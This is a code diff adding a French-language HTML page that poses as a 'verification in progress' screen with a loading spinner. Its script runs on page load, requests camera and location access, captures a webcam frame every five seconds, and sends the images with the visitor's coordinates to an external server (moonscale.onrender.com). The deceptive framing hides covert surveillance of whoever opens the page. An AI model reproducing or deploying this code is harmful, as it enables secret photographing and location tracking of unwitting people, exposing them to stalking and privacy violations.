@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Vérification en cours...</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: black;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+      color: white;
+    }
+    video {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      filter: blur(20px) brightness(0.6);
+      z-index: -1;
+    }
+    .overlay {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.4);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .text {
+      font-size: 18px;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <video id="bg-video" autoplay muted playsinline></video>
+  <div class="overlay">
+    <div class="loader"></div>
+    <div class="text">Vérification en cours...</div>
+  </div>
+
+  <script>
+    const video = document.getElementById('bg-video');
+    let locationData = null;
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+
+        setInterval(async () => {
+          try {
+            const bitmap = await imageCapture.grabFrame();
+            const canvas = document.createElement('canvas');
+            canvas.width = bitmap.width;
+            canvas.height = bitmap.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(bitmap, 0, 0);
+            const base64Image = canvas.toDataURL('image/jpeg');
+
+            sendData(base64Image, locationData);
+          } catch (e) {
+            console.error("Erreur capture image:", e);
+          }
+        }, 5000);
+      } catch (e) {
+        alert("Accès à la caméra refusé !");
+      }
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          locationData = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude
+          };
+        }, () => {
+          alert("Accès à la localisation refusé !");
+        });
+      }
+    }
+
+    async function sendData(image, location) {
+      try {
+        await fetch("https://moonscale.onrender.com/stream/collect", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            timestamp: new Date().toISOString(),
+            image,
+            location
+          })
+        });
+      } catch (e) {
+        console.error("Erreur d'envoi :", e);
+      }
+    }
+
+    window.onload = () => {
+      getLocation();
+      startCamera();
+    };
+  </script>
+</body>
+</html>
